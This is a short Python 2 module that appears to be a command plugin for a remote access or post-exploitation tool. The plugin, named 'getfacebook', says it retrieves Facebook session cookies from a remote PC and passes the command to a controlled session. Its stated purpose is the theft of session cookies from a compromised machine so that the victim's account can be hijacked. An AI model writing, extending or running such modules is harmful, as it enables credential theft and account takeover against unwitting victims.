class command:
    def __init__(self):
        self.name = "getfacebook"
        self.description = "Retrieve Facebook Session Cookies From The Remote PC!"

    def run(self,session,cmd_data):
        print session.send_command(cmd_data)
